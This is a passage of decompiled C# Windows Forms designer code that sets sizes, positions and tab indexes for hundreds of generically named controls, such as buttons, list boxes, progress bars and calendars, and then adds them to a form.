			this.Button32.UseVisualStyleBackColor = true;
			this.ProgressBar65.Location = new Point(4, 73);
			this.ProgressBar65.Name = "ProgressBar65";
			this.ProgressBar65.Size = new Size(57, 54);
			this.ProgressBar65.TabIndex = 464;
			this.ProgressBar66.Location = new Point(650, 256);
			this.ProgressBar66.Name = "ProgressBar66";
			this.ProgressBar66.Size = new Size(40, 96);
			this.ProgressBar66.TabIndex = 463;
			this.DateTimePicker33.Location = new Point(595, 206);
			this.DateTimePicker33.Name = "DateTimePicker33";
			this.DateTimePicker33.Size = new Size(85, 20);
			this.DateTimePicker33.TabIndex = 462;
			this.CheckedListBox49.FormattingEnabled = true;
			this.CheckedListBox49.Location = new Point(370, 38);
			this.CheckedListBox49.Name = "CheckedListBox49";
			this.CheckedListBox49.Size = new Size(151, 49);
			this.CheckedListBox49.TabIndex = 461;
			this.ListBox49.FormattingEnabled = true;
			this.ListBox49.Location = new Point(642, 115);
			this.ListBox49.Name = "ListBox49";
			this.ListBox49.Size = new Size(49, 69);
			this.ListBox49.TabIndex = 460;
			this.DateTimePicker34.Location = new Point(592, 27);
			this.DateTimePicker34.Name = "DateTimePicker34";
			this.DateTimePicker34.Size = new Size(52, 20);
			this.DateTimePicker34.TabIndex = 459;
			this.ListBox50.FormattingEnabled = true;
			this.ListBox50.Location = new Point(660, 46);
			this.ListBox50.Name = "ListBox50";
			this.ListBox50.Size = new Size(47, 4);
			this.ListBox50.TabIndex = 458;
			this.Label17.AutoSize = true;
			this.Label17.Location = new Point(447, 219);
			this.Label17.Name = "Label17";
			this.Label17.Size = new Size(45, 13);
			this.Label17.TabIndex = 457;
			this.Label17.Text = "Label17";
			this.MaskedTextBox33.Location = new Point(305, 164);
			this.MaskedTextBox33.Name = "MaskedTextBox33";
			this.MaskedTextBox33.Size = new Size(83, 20);
			this.MaskedTextBox33.TabIndex = 456;
			this.RadioButton33.AutoSize = true;
			this.RadioButton33.Location = new Point(432, 186);
			this.RadioButton33.Name = "RadioButton33";
			this.RadioButton33.Size = new Size(96, 17);
			this.RadioButton33.TabIndex = 455;
			this.RadioButton33.TabStop = true;
			this.RadioButton33.Text = "RadioButton33";
			this.RadioButton33.UseVisualStyleBackColor = true;
			this.PictureBox33.Location = new Point(274, 266);
			this.PictureBox33.Name = "PictureBox33";
			this.PictureBox33.Size = new Size(20, 20);
			this.PictureBox33.TabIndex = 454;
			this.PictureBox33.TabStop = false;
			this.MaskedTextBox34.Location = new Point(294, 219);
			this.MaskedTextBox34.Name = "MaskedTextBox34";
			this.MaskedTextBox34.Size = new Size(141, 20);
			this.MaskedTextBox34.TabIndex = 453;
			this.WebBrowser17.Location = new Point(435, 149);
			this.WebBrowser17.MinimumSize = new Size(20, 20);
			this.WebBrowser17.Name = "WebBrowser17";
			this.WebBrowser17.Size = new Size(69, 20);
			this.WebBrowser17.TabIndex = 452;
			this.TreeView17.Location = new Point(182, 195);
			this.TreeView17.Name = "TreeView17";
			this.TreeView17.Size = new Size(183, 112);
			this.TreeView17.TabIndex = 451;
			this.PictureBox34.Location = new Point(479, 186);
			this.PictureBox34.Name = "PictureBox34";
			this.PictureBox34.Size = new Size(166, 43);
			this.PictureBox34.TabIndex = 450;
			this.PictureBox34.TabStop = false;
			this.NumericUpDown17.Location = new Point(93, 282);
			this.NumericUpDown17.Name = "NumericUpDown17";
			this.NumericUpDown17.Size = new Size(78, 20);
			this.NumericUpDown17.TabIndex = 449;
			this.ProgressBar67.Location = new Point(13, 244);
			this.ProgressBar67.Name = "ProgressBar67";
			this.ProgressBar67.Size = new Size(74, 44);
			this.ProgressBar67.TabIndex = 448;
			this.RadioButton34.AutoSize = true;
			this.RadioButton34.Location = new Point(38, 316);
			this.RadioButton34.Name = "RadioButton34";
			this.RadioButton34.Size = new Size(96, 17);
			this.RadioButton34.TabIndex = 447;
			this.RadioButton34.TabStop = true;
			this.RadioButton34.Text = "RadioButton34";
			this.RadioButton34.UseVisualStyleBackColor = true;
			this.LinkLabel49.AutoSize = true;
			this.LinkLabel49.Location = new Point(0, 245);
			this.LinkLabel49.Name = "LinkLabel49";
			this.LinkLabel49.Size = new Size(65, 13);
			this.LinkLabel49.TabIndex = 446;
			this.LinkLabel49.TabStop = true;
			this.LinkLabel49.Text = "LinkLabel49";
			this.CheckBox33.AutoSize = true;
			this.CheckBox33.Location = new Point(136, 96);
			this.CheckBox33.Name = "CheckBox33";
			this.CheckBox33.Size = new Size(87, 17);
			this.CheckBox33.TabIndex = 445;
			this.CheckBox33.Text = "CheckBox33";
			this.CheckBox33.UseVisualStyleBackColor = true;
			this.ComboBox33.FormattingEnabled = true;
			this.ComboBox33.Location = new Point(127, 57);
			this.ComboBox33.Name = "ComboBox33";
			this.ComboBox33.Size = new Size(115, 21);
			this.ComboBox33.TabIndex = 444;
			this.Button33.Location = new Point(504, 164);
			this.Button33.Name = "Button33";
			this.Button33.Size = new Size(75, 23);
			this.Button33.TabIndex = 443;
			this.Button33.Text = "Button33";
			this.Button33.UseVisualStyleBackColor = true;
			this.NotifyIcon3.Text = "NotifyIcon1";
			this.NotifyIcon3.Visible = true;
			this.CheckedListBox50.FormattingEnabled = true;
			this.CheckedListBox50.Location = new Point(3, 177);
			this.CheckedListBox50.Name = "CheckedListBox50";
			this.CheckedListBox50.Size = new Size(222, 4);
			this.CheckedListBox50.TabIndex = 442;
			this.ComboBox34.FormattingEnabled = true;
			this.ComboBox34.Location = new Point(125, 88);
			this.ComboBox34.Name = "ComboBox34";
			this.ComboBox34.Size = new Size(101, 21);
			this.ComboBox34.TabIndex = 441;
			this.MonthCalendar35.Location = new Point(61, 127);
			this.MonthCalendar35.Name = "MonthCalendar35";
			this.MonthCalendar35.TabIndex = 440;
			this.MonthCalendar36.Location = new Point(388, 250);
			this.MonthCalendar36.Name = "MonthCalendar36";
			this.MonthCalendar36.TabIndex = 439;
			this.LinkLabel50.AutoSize = true;
			this.LinkLabel50.Location = new Point(68, 58);
			this.LinkLabel50.Name = "LinkLabel50";
			this.LinkLabel50.Size = new Size(65, 13);
			this.LinkLabel50.TabIndex = 438;
			this.LinkLabel50.TabStop = true;
			this.LinkLabel50.Text = "LinkLabel50";
			this.ProgressBar68.Location = new Point(39, 146);
			this.ProgressBar68.Name = "ProgressBar68";
			this.ProgressBar68.Size = new Size(93, 107);
			this.ProgressBar68.TabIndex = 437;
			this.LinkLabel51.AutoSize = true;
			this.LinkLabel51.Location = new Point(419, 232);
			this.LinkLabel51.Name = "LinkLabel51";
			this.LinkLabel51.Size = new Size(65, 13);
			this.LinkLabel51.TabIndex = 436;
			this.LinkLabel51.TabStop = true;
			this.LinkLabel51.Text = "LinkLabel51";
			this.ListBox51.FormattingEnabled = true;
			this.ListBox51.Location = new Point(226, 297);
			this.ListBox51.Name = "ListBox51";
			this.ListBox51.Size = new Size(165, 69);
			this.ListBox51.TabIndex = 435;
			this.CheckBox34.AutoSize = true;
			this.CheckBox34.Location = new Point(116, 266);
			this.CheckBox34.Name = "CheckBox34";
			this.CheckBox34.Size = new Size(87, 17);
			this.CheckBox34.TabIndex = 434;
			this.CheckBox34.Text = "CheckBox34";
			this.CheckBox34.UseVisualStyleBackColor = true;
			this.CheckedListBox51.FormattingEnabled = true;
			this.CheckedListBox51.Location = new Point(277, 101);
			this.CheckedListBox51.Name = "CheckedListBox51";
			this.CheckedListBox51.Size = new Size(303, 49);
			this.CheckedListBox51.TabIndex = 433;
			this.Button34.Location = new Point(195, 146);
			this.Button34.Name = "Button34";
			this.Button34.Size = new Size(156, 50);
			this.Button34.TabIndex = 432;
			this.Button34.Text = "Button34";
			this.Button34.UseVisualStyleBackColor = true;
			this.ProgressBar69.Location = new Point(4, 46);
			this.ProgressBar69.Name = "ProgressBar69";
			this.ProgressBar69.Size = new Size(57, 54);
			this.ProgressBar69.TabIndex = 431;
			this.ProgressBar70.Location = new Point(650, 229);
			this.ProgressBar70.Name = "ProgressBar70";
			this.ProgressBar70.Size = new Size(40, 96);
			this.ProgressBar70.TabIndex = 430;
			this.DateTimePicker35.Location = new Point(595, 179);
			this.DateTimePicker35.Name = "DateTimePicker35";
			this.DateTimePicker35.Size = new Size(85, 20);
			this.DateTimePicker35.TabIndex = 429;
			this.CheckedListBox52.FormattingEnabled = true;
			this.CheckedListBox52.Location = new Point(370, 11);
			this.CheckedListBox52.Name = "CheckedListBox52";
			this.CheckedListBox52.Size = new Size(151, 49);
			this.CheckedListBox52.TabIndex = 428;
			this.ListBox52.FormattingEnabled = true;
			this.ListBox52.Location = new Point(642, 88);
			this.ListBox52.Name = "ListBox52";
			this.ListBox52.Size = new Size(49, 69);
			this.ListBox52.TabIndex = 427;
			this.DateTimePicker36.Location = new Point(592, 0);
			this.DateTimePicker36.Name = "DateTimePicker36";
			this.DateTimePicker36.Size = new Size(52, 20);
			this.DateTimePicker36.TabIndex = 426;
			this.ListBox53.FormattingEnabled = true;
			this.ListBox53.Location = new Point(660, 19);
			this.ListBox53.Name = "ListBox53";
			this.ListBox53.Size = new Size(47, 4);
			this.ListBox53.TabIndex = 425;
			this.Label18.AutoSize = true;
			this.Label18.Location = new Point(447, 192);
			this.Label18.Name = "Label18";
			this.Label18.Size = new Size(45, 13);
			this.Label18.TabIndex = 424;
			this.Label18.Text = "Label18";
			this.MaskedTextBox35.Location = new Point(305, 137);
			this.MaskedTextBox35.Name = "MaskedTextBox35";
			this.MaskedTextBox35.Size = new Size(83, 20);
			this.MaskedTextBox35.TabIndex = 423;
			this.RadioButton35.AutoSize = true;
			this.RadioButton35.Location = new Point(432, 159);
			this.RadioButton35.Name = "RadioButton35";
			this.RadioButton35.Size = new Size(96, 17);
			this.RadioButton35.TabIndex = 422;
			this.RadioButton35.TabStop = true;
			this.RadioButton35.Text = "RadioButton35";
			this.RadioButton35.UseVisualStyleBackColor = true;
			this.PictureBox35.Location = new Point(274, 239);
			this.PictureBox35.Name = "PictureBox35";
			this.PictureBox35.Size = new Size(20, 20);
			this.PictureBox35.TabIndex = 421;
			this.PictureBox35.TabStop = false;
			this.MaskedTextBox36.Location = new Point(294, 192);
			this.MaskedTextBox36.Name = "MaskedTextBox36";
			this.MaskedTextBox36.Size = new Size(141, 20);
			this.MaskedTextBox36.TabIndex = 420;
			this.WebBrowser18.Location = new Point(435, 122);
			this.WebBrowser18.MinimumSize = new Size(20, 20);
			this.WebBrowser18.Name = "WebBrowser18";
			this.WebBrowser18.Size = new Size(69, 20);
			this.WebBrowser18.TabIndex = 419;
			this.TreeView18.Location = new Point(182, 168);
			this.TreeView18.Name = "TreeView18";
			this.TreeView18.Size = new Size(183, 112);
			this.TreeView18.TabIndex = 418;
			this.PictureBox36.Location = new Point(479, 159);
			this.PictureBox36.Name = "PictureBox36";
			this.PictureBox36.Size = new Size(166, 43);
			this.PictureBox36.TabIndex = 417;
			this.PictureBox36.TabStop = false;
			this.NumericUpDown18.Location = new Point(93, 255);
			this.NumericUpDown18.Name = "NumericUpDown18";
			this.NumericUpDown18.Size = new Size(78, 20);
			this.NumericUpDown18.TabIndex = 416;
			this.ProgressBar71.Location = new Point(13, 217);
			this.ProgressBar71.Name = "ProgressBar71";
			this.ProgressBar71.Size = new Size(74, 44);
			this.ProgressBar71.TabIndex = 415;
			this.RadioButton36.AutoSize = true;
			this.RadioButton36.Location = new Point(38, 289);
			this.RadioButton36.Name = "RadioButton36";
			this.RadioButton36.Size = new Size(96, 17);
			this.RadioButton36.TabIndex = 414;
			this.RadioButton36.TabStop = true;
			this.RadioButton36.Text = "RadioButton36";
			this.RadioButton36.UseVisualStyleBackColor = true;
			this.LinkLabel52.AutoSize = true;
			this.LinkLabel52.Location = new Point(0, 218);
			this.LinkLabel52.Name = "LinkLabel52";
			this.LinkLabel52.Size = new Size(65, 13);
			this.LinkLabel52.TabIndex = 413;
			this.LinkLabel52.TabStop = true;
			this.LinkLabel52.Text = "LinkLabel52";
			this.CheckBox35.AutoSize = true;
			this.CheckBox35.Location = new Point(136, 69);
			this.CheckBox35.Name = "CheckBox35";
			this.CheckBox35.Size = new Size(87, 17);
			this.CheckBox35.TabIndex = 412;
			this.CheckBox35.Text = "CheckBox35";
			this.CheckBox35.UseVisualStyleBackColor = true;
			this.ComboBox35.FormattingEnabled = true;
			this.ComboBox35.Location = new Point(127, 30);
			this.ComboBox35.Name = "ComboBox35";
			this.ComboBox35.Size = new Size(115, 21);
			this.ComboBox35.TabIndex = 411;
			this.Button35.Location = new Point(504, 137);
			this.Button35.Name = "Button35";
			this.Button35.Size = new Size(75, 23);
			this.Button35.TabIndex = 410;
			this.Button35.Text = "Button35";
			this.Button35.UseVisualStyleBackColor = true;
			this.CheckedListBox53.FormattingEnabled = true;
			this.CheckedListBox53.Location = new Point(3, 150);
			this.CheckedListBox53.Name = "CheckedListBox53";
			this.CheckedListBox53.Size = new Size(222, 4);
			this.CheckedListBox53.TabIndex = 409;
			this.ComboBox36.FormattingEnabled = true;
			this.ComboBox36.Location = new Point(125, 61);
			this.ComboBox36.Name = "ComboBox36";
			this.ComboBox36.Size = new Size(101, 21);
			this.ComboBox36.TabIndex = 408;
			this.MonthCalendar37.Location = new Point(61, 100);
			this.MonthCalendar37.Name = "MonthCalendar37";
			this.MonthCalendar37.TabIndex = 407;
			this.MonthCalendar38.Location = new Point(388, 223);
			this.MonthCalendar38.Name = "MonthCalendar38";
			this.MonthCalendar38.TabIndex = 406;
			this.LinkLabel53.AutoSize = true;
			this.LinkLabel53.Location = new Point(68, 31);
			this.LinkLabel53.Name = "LinkLabel53";
			this.LinkLabel53.Size = new Size(65, 13);
			this.LinkLabel53.TabIndex = 405;
			this.LinkLabel53.TabStop = true;
			this.LinkLabel53.Text = "LinkLabel53";
			this.ProgressBar72.Location = new Point(39, 119);
			this.ProgressBar72.Name = "ProgressBar72";
			this.ProgressBar72.Size = new Size(93, 107);
			this.ProgressBar72.TabIndex = 404;
			this.MonthCalendar39.Location = new Point(16, 346);
			this.MonthCalendar39.Name = "MonthCalendar39";
			this.MonthCalendar39.TabIndex = 403;
			this.LinkLabel54.AutoSize = true;
			this.LinkLabel54.Location = new Point(419, 205);
			this.LinkLabel54.Name = "LinkLabel54";
			this.LinkLabel54.Size = new Size(65, 13);
			this.LinkLabel54.TabIndex = 402;
			this.LinkLabel54.TabStop = true;
			this.LinkLabel54.Text = "LinkLabel54";
			this.ListBox54.FormattingEnabled = true;
			this.ListBox54.Location = new Point(226, 270);
			this.ListBox54.Name = "ListBox54";
			this.ListBox54.Size = new Size(165, 69);
			this.ListBox54.TabIndex = 401;
			this.CheckBox36.AutoSize = true;
			this.CheckBox36.Location = new Point(116, 239);
			this.CheckBox36.Name = "CheckBox36";
			this.CheckBox36.Size = new Size(87, 17);
			this.CheckBox36.TabIndex = 400;
			this.CheckBox36.Text = "CheckBox36";
			this.CheckBox36.UseVisualStyleBackColor = true;
			this.CheckedListBox54.FormattingEnabled = true;
			this.CheckedListBox54.Location = new Point(277, 74);
			this.CheckedListBox54.Name = "CheckedListBox54";
			this.CheckedListBox54.Size = new Size(303, 49);
			this.CheckedListBox54.TabIndex = 399;
			this.Button36.Location = new Point(195, 119);
			this.Button36.Name = "Button36";
			this.Button36.Size = new Size(156, 50);
			this.Button36.TabIndex = 398;
			this.Button36.Text = "Button36";
			this.Button36.UseVisualStyleBackColor = true;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(800, 450);
			base.Controls.Add(this.ProgressBar49);
			base.Controls.Add(this.ProgressBar50);
			base.Controls.Add(this.DateTimePicker25);
			base.Controls.Add(this.CheckedListBox37);
			base.Controls.Add(this.ListBox37);
			base.Controls.Add(this.DateTimePicker26);
			base.Controls.Add(this.ListBox38);
			base.Controls.Add(this.Label13);
			base.Controls.Add(this.MaskedTextBox25);
			base.Controls.Add(this.RadioButton25);
			base.Controls.Add(this.PictureBox25);
			base.Controls.Add(this.MaskedTextBox26);
			base.Controls.Add(this.WebBrowser13);
			base.Controls.Add(this.TreeView13);
			base.Controls.Add(this.PictureBox26);
			base.Controls.Add(this.NumericUpDown13);
			base.Controls.Add(this.ProgressBar51);
			base.Controls.Add(this.RadioButton26);
			base.Controls.Add(this.LinkLabel37);
			base.Controls.Add(this.CheckBox25);
			base.Controls.Add(this.ComboBox25);
			base.Controls.Add(this.Button25);
			base.Controls.Add(this.CheckedListBox38);
			base.Controls.Add(this.ComboBox26);
			base.Controls.Add(this.MonthCalendar27);
			base.Controls.Add(this.MonthCalendar28);
			base.Controls.Add(this.LinkLabel38);
			base.Controls.Add(this.ProgressBar52);
			base.Controls.Add(this.LinkLabel39);
			base.Controls.Add(this.ListBox39);
			base.Controls.Add(this.CheckBox26);
			base.Controls.Add(this.CheckedListBox39);
			base.Controls.Add(this.Button26);
			base.Controls.Add(this.ProgressBar53);
			base.Controls.Add(this.ProgressBar54);
			base.Controls.Add(this.DateTimePicker27);
			base.Controls.Add(this.CheckedListBox40);
			base.Controls.Add(this.ListBox40);
			base.Controls.Add(this.DateTimePicker28);
			base.Controls.Add(this.ListBox41);
			base.Controls.Add(this.Label14);
			base.Controls.Add(this.MaskedTextBox27);
			base.Controls.Add(this.RadioButton27);
			base.Controls.Add(this.PictureBox27);
			base.Controls.Add(this.MaskedTextBox28);
			base.Controls.Add(this.WebBrowser14);
			base.Controls.Add(this.TreeView14);
			base.Controls.Add(this.PictureBox28);
			base.Controls.Add(this.NumericUpDown14);
			base.Controls.Add(this.ProgressBar55);
			base.Controls.Add(this.RadioButton28);
			base.Controls.Add(this.LinkLabel40);
			base.Controls.Add(this.CheckBox27);
			base.Controls.Add(this.ComboBox27);
			base.Controls.Add(this.Button27);
			base.Controls.Add(this.CheckedListBox41);
			base.Controls.Add(this.ComboBox28);
			base.Controls.Add(this.MonthCalendar29);
			base.Controls.Add(this.MonthCalendar30);
			base.Controls.Add(this.LinkLabel41);
			base.Controls.Add(this.ProgressBar56);
			base.Controls.Add(this.LinkLabel42);
			base.Controls.Add(this.ListBox42);
			base.Controls.Add(this.CheckBox28);
			base.Controls.Add(this.CheckedListBox42);
			base.Controls.Add(this.Button28);
			base.Controls.Add(this.ProgressBar57);
			base.Controls.Add(this.ProgressBar58);
			base.Controls.Add(this.DateTimePicker29);
			base.Controls.Add(this.CheckedListBox43);
			base.Controls.Add(this.ListBox43);
			base.Controls.Add(this.DateTimePicker30);
			base.Controls.Add(this.ListBox44);
			base.Controls.Add(this.Label15);
			base.Controls.Add(this.MaskedTextBox29);
			base.Controls.Add(this.RadioButton29);
			base.Controls.Add(this.PictureBox29);
			base.Controls.Add(this.MaskedTextBox30);
			base.Controls.Add(this.WebBrowser15);
			base.Controls.Add(this.TreeView15);
			base.Controls.Add(this.PictureBox30);
			base.Controls.Add(this.NumericUpDown15);
			base.Controls.Add(this.ProgressBar59);
			base.Controls.Add(this.RadioButton30);
			base.Controls.Add(this.LinkLabel43);
			base.Controls.Add(this.CheckBox29);
			base.Controls.Add(this.ComboBox29);
			base.Controls.Add(this.Button29);
			base.Controls.Add(this.CheckedListBox44);
			base.Controls.Add(this.ComboBox30);
			base.Controls.Add(this.MonthCalendar31);
			base.Controls.Add(this.MonthCalendar32);
			base.Controls.Add(this.LinkLabel44);
			base.Controls.Add(this.ProgressBar60);
			base.Controls.Add(this.LinkLabel45);
			base.Controls.Add(this.ListBox45);
			base.Controls.Add(this.CheckBox30);
			base.Controls.Add(this.CheckedListBox45);
			base.Controls.Add(this.Button30);
			base.Controls.Add(this.ProgressBar61);
			base.Controls.Add(this.ProgressBar62);
			base.Controls.Add(this.DateTimePicker31);
			base.Controls.Add(this.CheckedListBox46);
			base.Controls.Add(this.ListBox46);
			base.Controls.Add(this.DateTimePicker32);
			base.Controls.Add(this.ListBox47);
			base.Controls.Add(this.Label16);
			base.Controls.Add(this.MaskedTextBox31);
			base.Controls.Add(this.RadioButton31);
			base.Controls.Add(this.PictureBox31);
			base.Controls.Add(this.MaskedTextBox32);
			base.Controls.Add(this.WebBrowser16);
			base.Controls.Add(this.TreeView16);
			base.Controls.Add(this.PictureBox32);
			base.Controls.Add(this.NumericUpDown16);
			base.Controls.Add(this.ProgressBar63);
			base.Controls.Add(this.RadioButton32);
			base.Controls.Add(this.LinkLabel46);
			base.Controls.Add(this.CheckBox31);
			base.Controls.Add(this.ComboBox31);
			base.Controls.Add(this.Button31);
			base.Controls.Add(this.CheckedListBox47);
			base.Controls.Add(this.ComboBox32);
			base.Controls.Add(this.MonthCalendar33);
			base.Controls.Add(this.MonthCalendar34);
			base.Controls.Add(this.LinkLabel47);
			base.Controls.Add(this.ProgressBar64);
			base.Controls.Add(this.LinkLabel48);
			base.Controls.Add(this.ListBox48);
			base.Controls.Add(this.CheckBox32);
			base.Controls.Add(this.CheckedListBox48);
			base.Controls.Add(this.Button32);
			base.Controls.Add(this.ProgressBar65);
			base.Controls.Add(this.ProgressBar66);
			base.Controls.Add(this.DateTimePicker33);
			base.Controls.Add(this.CheckedListBox49);
			base.Controls.Add(this.ListBox49);
			base.Controls.Add(this.DateTimePicker34);
			base.Controls.Add(this.ListBox50);
			base.Controls.Add(this.Label17);
			base.Controls.Add(this.MaskedTextBox33);
			base.Controls.Add(this.RadioButton33);
			base.Controls.Add(this.PictureBox33);
			base.Controls.Add(this.MaskedTextBox34);
			base.Controls.Add(this.WebBrowser17);
			base.Controls.Add(this.TreeView17);
			base.Controls.Add(this.PictureBox34);
			base.Controls.Add(this.NumericUpDown17);
			base.Controls.Add(this.ProgressBar67);
			base.Controls.Add(this.RadioButton34);
			base.Controls.Add(this.LinkLabel49);
			base.Controls.Add(this.CheckBox33);
			base.Controls.Add(this.ComboBox33);
			base.Controls.Add(this.Button33);
			base.Controls.Add(this.CheckedListBox50);
			base.Controls.Add(this.ComboBox34);
			base.Controls.Add(this.MonthCalendar35);
			base.Controls.Add(this.MonthCalendar36);
			base.Controls.Add(this.LinkLabel50);
			base.Controls.Add(this.ProgressBar68);
			base.Controls.Add(this.LinkLabel51);
			base.Controls.Add(this.ListBox51);
			base.Controls.Add(this.CheckBox34);
			base.Controls.Add(this.CheckedListBox51);
			base.Controls.Add(this.Button34);
			base.Controls.Add(this.ProgressBar69);
			base.Controls.Add(this.ProgressBar70);
			base.Controls.Add(this.DateTimePicker35);
			base.Controls.Add(this.CheckedListBox52);
			base.Controls.Add(this.ListBox52);
			base.Controls.Add(this.DateTimePicker36);
			base.Controls.Add(this.ListBox53);
			base.Controls.Add(this.Label18);
			base.Controls.Add(this.MaskedTextBox35);
			base.Controls.Add(this.RadioButton35);
			base.Controls.Add(this.PictureBox35);
			base.Controls.Add(this.MaskedTextBox36);
			base.Controls.Add(this.WebBrowser18);
			base.Controls.Add(this.TreeView18);
			base.Controls.Add(this.PictureBox36);
			base.Controls.Add(this.NumericUpDown18);
			base.Controls.Add(this.ProgressBar71);
			base.Controls.Add(this.RadioButton36);
			base.Controls.Add(this.LinkLabel52);
			base.Controls.Add(this.CheckBox35);
			base.Controls.Add(this.ComboBox35);
			base.Controls.Add(this.Button35);
			base.Controls.Add(this.CheckedListBox53);
			base.Controls.Add(this.ComboBox36);
			base.Controls.Add(this.MonthCalendar37);
			base.Controls.Add(this.MonthCalendar38);
			base.Controls.Add(this.LinkLabel53);
			base.Controls.Add(this.ProgressBar72);
			base.Controls.Add(this.MonthCalendar39);
			base.Controls.Add(this.LinkLabel54);
			base.Controls.Add(this.ListBox54);
			base.Controls.Add(this.CheckBox36);
			base.Controls.Add(this.CheckedListBox54);
			base.Controls.Add(this.Button36);
			base.Controls.Add(this.ProgressBar25);
			base.Controls.Add(this.ProgressBar26);
			base.Controls.Add(this.DateTimePicker13);
			base.Controls.Add(this.CheckedListBox19);
			base.Controls.Add(this.ListBox19);
			base.Controls.Add(this.DateTimePicker14);
			base.Controls.Add(this.ListBox20);
			base.Controls.Add(this.Label7);
			base.Controls.Add(this.MaskedTextBox13);
			base.Controls.Add(this.RadioButton13);
			base.Controls.Add(this.PictureBox13);
			base.Controls.Add(this.MaskedTextBox14);
			base.Controls.Add(this.WebBrowser7);
			base.Controls.Add(this.TreeView7);
			base.Controls.Add(this.PictureBox14);
			base.Controls.Add(this.NumericUpDown7);
			base.Controls.Add(this.ProgressBar27);
			base.Controls.Add(this.RadioButton14);
			base.Controls.Add(this.LinkLabel19);
			base.Controls.Add(this.CheckBox13);
			base.Controls.Add(this.ComboBox13);
			base.Controls.Add(this.Button13);
			base.Controls.Add(this.CheckedListBox20);
			base.Controls.Add(this.ComboBox14);
			base.Controls.Add(this.MonthCalendar14);
			base.Controls.Add(this.MonthCalendar15);
			base.Controls.Add(this.LinkLabel20);
			base.Controls.Add(this.ProgressBar28);
			base.Controls.Add(this.LinkLabel21);
			base.Controls.Add(this.ListBox21);
			base.Controls.Add(this.CheckBox14);
			base.Controls.Add(this.CheckedListBox21);
			base.Controls.Add(this.Button14);
			base.Controls.Add(this.ProgressBar29);
			base.Controls.Add(this.ProgressBar30);
			base.Controls.Add(this.DateTimePicker15);
			base.Controls.Add(this.CheckedListBox22);
			base.Controls.Add(this.ListBox22);
			base.Controls.Add(this.DateTimePicker16);
			base.Controls.Add(this.ListBox23);
			base.Controls.Add(this.Label8);
			base.Controls.Add(this.MaskedTextBox15);
			base.Controls.Add(this.RadioButton15);
			base.Controls.Add(this.PictureBox15);
			base.Controls.Add(this.MaskedTextBox16);
			base.Controls.Add(this.WebBrowser8);
			base.Controls.Add(this.TreeView8);
			base.Controls.Add(this.PictureBox16);
			base.Controls.Add(this.NumericUpDown8);
			base.Controls.Add(this.ProgressBar31);
			base.Controls.Add(this.RadioButton16);
			base.Controls.Add(this.LinkLabel22);
			base.Controls.Add(this.CheckBox15);
			base.Controls.Add(this.ComboBox15);
			base.Controls.Add(this.Button15);
			base.Controls.Add(this.CheckedListBox23);
			base.Controls.Add(this.ComboBox16);
			base.Controls.Add(this.MonthCalendar16);
			base.Controls.Add(this.MonthCalendar17);
			base.Controls.Add(this.LinkLabel23);
			base.Controls.Add(this.ProgressBar32);
			base.Controls.Add(this.LinkLabel24);
			base.Controls.Add(this.ListBox24);
			base.Controls.Add(this.CheckBox16);
			base.Controls.Add(this.CheckedListBox24);
			base.Controls.Add(this.Button16);
			base.Controls.Add(this.ProgressBar33);
			base.Controls.Add(this.ProgressBar34);
			base.Controls.Add(this.DateTimePicker17);
			base.Controls.Add(this.CheckedListBox25);
			base.Controls.Add(this.ListBox25);
			base.Controls.Add(this.DateTimePicker18);
			base.Controls.Add(this.ListBox26);
			base.Controls.Add(this.Label9);
			base.Controls.Add(this.MaskedTextBox17);
			base.Controls.Add(this.RadioButton17);
			base.Controls.Add(this.PictureBox17);
			base.Controls.Add(this.MaskedTextBox18);
			base.Controls.Add(this.WebBrowser9);
			base.Controls.Add(this.TreeView9);
			base.Controls.Add(this.PictureBox18);
			base.Controls.Add(this.NumericUpDown9);
			base.Controls.Add(this.ProgressBar35);
			base.Controls.Add(this.RadioButton18);
			base.Controls.Add(this.LinkLabel25);
			base.Controls.Add(this.CheckBox17);
			base.Controls.Add(this.ComboBox17);
			base.Controls.Add(this.Button17);
			base.Controls.Add(this.CheckedListBox26);
			base.Controls.Add(this.ComboBox18);
			base.Controls.Add(this.MonthCalendar18);
			base.Controls.Add(this.MonthCalendar19);
			base.Controls.Add(this.LinkLabel26);
			base.Controls.Add(this.ProgressBar36);
			base.Controls.Add(this.LinkLabel27);
			base.Controls.Add(this.ListBox27);
			base.Controls.Add(this.CheckBox18);
			base.Controls.Add(this.CheckedListBox27);
			base.Controls.Add(this.Button18);
			base.Controls.Add(this.ProgressBar37);
			base.Controls.Add(this.ProgressBar38);
			base.Controls.Add(this.DateTimePicker19);
			base.Controls.Add(this.CheckedListBox28);
			base.Controls.Add(this.ListBox28);
			base.Controls.Add(this.DateTimePicker20);
			base.Controls.Add(this.ListBox29);
			base.Controls.Add(this.Label10);
			base.Controls.Add(this.MaskedTextBox19);
			base.Controls.Add(this.RadioButton19);
			base.Controls.Add(this.PictureBox19);
			base.Controls.Add(this.MaskedTextBox20);
			base.Controls.Add(this.WebBrowser10);
			base.Controls.Add(this.TreeView10);
			base.Controls.Add(this.PictureBox20);
			base.Controls.Add(this.NumericUpDown10);
			base.Controls.Add(this.ProgressBar39);
			base.Controls.Add(this.RadioButton20);
			base.Controls.Add(this.LinkLabel28);
			base.Controls.Add(this.CheckBox19);
			base.Controls.Add(this.ComboBox19);
			base.Controls.Add(this.Button19);
			base.Controls.Add(this.CheckedListBox29);
			base.Controls.Add(this.ComboBox20);
			base.Controls.Add(this.MonthCalendar20);
			base.Controls.Add(this.MonthCalendar21);
			base.Controls.Add(this.LinkLabel29);
			base.Controls.Add(this.ProgressBar40);
			base.Controls.Add(this.LinkLabel30);
			base.Controls.Add(this.ListBox30);
			base.Controls.Add(this.CheckBox20);
			base.Controls.Add(this.CheckedListBox30);
			base.Controls.Add(this.Button20);
			base.Controls.Add(this.ProgressBar41);
			base.Controls.Add(this.ProgressBar42);
			base.Controls.Add(this.DateTimePicker21);
			base.Controls.Add(this.CheckedListBox31);
			base.Controls.Add(this.ListBox31);
			base.Controls.Add(this.DateTimePicker22);
			base.Controls.Add(this.ListBox32);
			base.Controls.Add(this.Label11);
			base.Controls.Add(this.MaskedTextBox21);
			base.Controls.Add(this.RadioButton21);
			base.Controls.Add(this.PictureBox21);
			base.Controls.Add(this.MaskedTextBox22);
			base.Controls.Add(this.WebBrowser11);
			base.Controls.Add(this.TreeView11);
			base.Controls.Add(this.PictureBox22);
			base.Controls.Add(this.NumericUpDown11);
			base.Controls.Add(this.ProgressBar43);
			base.Controls.Add(this.RadioButton22);
			base.Controls.Add(this.LinkLabel31);
			base.Controls.Add(this.CheckBox21);
